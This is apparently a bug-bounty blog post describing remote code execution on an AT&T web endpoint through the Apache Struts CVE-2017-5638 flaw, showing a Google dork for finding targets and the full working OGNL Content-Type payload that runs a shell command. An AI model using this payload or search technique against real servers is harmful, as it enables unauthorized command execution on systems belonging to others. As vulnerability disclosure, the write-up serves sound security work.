---
source: corben-leo
source_url: https://corben.io/blog/17-3-10-att-rce
title: "Remote Code Execution in AT&T"
description: "Remote Code Execution on AT&T via CVE-2017-5638"
---

I was pentesting AT&T to see if I could find a vulnerability (as one does), around 4-5 days after CVE-2017-5638 was released. Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 is vulnerable to **Server-Side Template Injection**, which allows attackers to execute commands on any vulnerable server.

Basically, the file upload interceptor for these vulnerable versions "attempted to resolve error messages using a potentially dangerous function that evaluates OGNL." It's not actually a vulnerability within the Jakarta request wrapper, but rather in the file upload interceptor.

I instantly was curious about this vulnerability and went to see if AT&T ran Struts, so I started off with a simple Google dork: `site:att.com + ext:action`

and *A LOT* of results came up! I grabbed a random one: `https://www.att.com/tobrcontract/tobrinfotc.action`


I opened up Burp Suite, intercepted the request and sent it to the Repeater. I added this payload in the content-type header to see if it was vulnerable:

`Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).! (#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='uname -a').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}`


I sent the request and to my surprise, the command executed!

I was absolutely astounded that after a week of this 0day being released, that such a big company would still be vulnerable WHEN they had a security team and bug bounty program! I also identified a subdomain that was vulnerable. All goes to show that if you are WORKING in information security, it would be smart to pay attention to the community and to the news so you can protect yourself. Regardless, that's how I could've pwned AT&T, which would have affected their hundreds millions of customers (~147 million wireless customers in the U.S. and Mexico).

Thanks for reading!

**Corben Leo**